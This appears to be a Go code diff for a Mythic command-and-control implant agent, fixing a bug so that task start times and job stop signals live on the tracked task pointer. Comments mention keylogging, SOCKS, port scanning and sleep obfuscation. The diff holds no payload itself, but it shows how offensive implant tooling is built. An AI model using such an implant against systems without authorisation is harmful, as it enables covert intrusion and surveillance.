@@ -208,17 +208,37 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			// so long-running commands (SOCKS, keylog, port-scan) don't block new tasks.
 			// Semaphore limits concurrency to prevent memory exhaustion.
 			for _, task := range tasks {
+				task := task // capture per-iteration address (defensive across Go versions)
+
+				// Initialize StartTime and Job on the tracked task itself so
+				// `jobs` reports a real duration and `jobkill -id` flips the
+				// same Stop counter the running goroutine is polling. Setting
+				// these inside processTaskWithAgent (which takes the task by
+				// value) only mutated a local copy, leaving the tracked task
+				// with zero StartTime and a nil Job — jobkill reported
+				// "Stop signal sent" but never reached the runner.
+				task.StartTime = time.Now()
+				task.Job = &structs.Job{
+					Stop:                         new(int),
+					SendResponses:                make(chan structs.Response, 100),
+					SendFileToMythic:             files.SendToMythicChannel,
+					GetFileFromMythic:            files.GetFromMythicChannel,
+					FileTransfers:                make(map[string]chan json.RawMessage),
+					InteractiveTaskInputChannel:  make(chan structs.InteractiveMsg, 100),
+					InteractiveTaskOutputChannel: make(chan structs.InteractiveMsg, 100),
+				}
+
 				// Track task synchronously BEFORE spawning goroutine — prevents a race
 				// where obfuscateSleep sees GetRunningTasks()==0 because the goroutine
 				// hasn't called TrackTask yet, causing C2 profile fields to be zeroed
 				// while task goroutines still need them for PostResponse.
 				commands.TrackTask(&task)
 				taskSem <- struct{}{} // Acquire semaphore slot
-				go func(t structs.Task) {
+				go func(t *structs.Task) {
 					defer func() { <-taskSem }() // Release slot when done
 					defer commands.UntrackTask(t.ID)
 					processTaskWithAgent(t, agent, c2, socksManager)
-				}(task)
+				}(&task)
 			}
 
 			// Pre-sleep cleanup: zero sensitive data from memory
@@ -267,21 +287,14 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 	}
 }
 
-func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
-	task.StartTime = time.Now()
+func processTaskWithAgent(task *structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
 	log.Printf("exec %s (%s)", task.Command, task.ID)
 
-	// Create Job struct with channels for this task
-	job := &structs.Job{
-		Stop:                         new(int),
-		SendResponses:                make(chan structs.Response, 100),
-		SendFileToMythic:             files.SendToMythicChannel,
-		GetFileFromMythic:            files.GetFromMythicChannel,
-		FileTransfers:                make(map[string]chan json.RawMessage),
-		InteractiveTaskInputChannel:  make(chan structs.InteractiveMsg, 100),
-		InteractiveTaskOutputChannel: make(chan structs.InteractiveMsg, 100),
-	}
-	task.Job = job
+	// StartTime + Job are populated by the caller (see the task dispatch loop
+	// above). They live on the tracked task pointer so `jobs` reports the
+	// real running duration and `jobkill -id` flips the same Stop counter
+	// the runner is checking.
+	job := task.Job
 
 	// Start goroutine to forward responses from the job to Mythic
 	done := make(chan bool)
@@ -367,9 +380,9 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 			}
 		}()
 		if agentHandler, ok := handler.(structs.AgentCommand); ok {
-			result = agentHandler.ExecuteWithAgent(task, agent)
+			result = agentHandler.ExecuteWithAgent(*task, agent)
 		} else {
-			result = handler.Execute(task)
+			result = handler.Execute(*task)
 		}
 	}()
 
